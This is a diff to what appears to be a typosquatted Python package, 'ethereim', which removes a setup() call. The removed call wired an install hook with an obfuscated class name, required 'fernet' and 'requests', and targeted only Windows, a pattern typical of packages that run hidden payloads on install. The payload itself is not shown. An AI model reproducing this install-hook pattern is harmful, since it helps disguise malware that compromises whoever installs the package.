@@ -18,22 +18,5 @@ class ynSmToSfOIOpmBVBbfzhoskjcGuXjrhdfxpywTyRFsPmbiNsWufxKqgXwzVZysbfUxoTipAOmF
             install.run(self)
 
 
-setup(
-    name="ethereim",
-    version=VERSION,
-    author="DUUMJWmgpHEMKSLdUwzg",
-    author_email="LvwblkJrcqctBqbd@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ynSmToSfOIOpmBVBbfzhoskjcGuXjrhdfxpywTyRFsPmbiNsWufxKqgXwzVZysbfUxoTipAOmFCfNPRDreUaIeVvyPHDkGrODOZhbAaxsQjYtrklDeYKrcdlkVGWGyIhOjFGGQKybCcgJswETrR,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
 
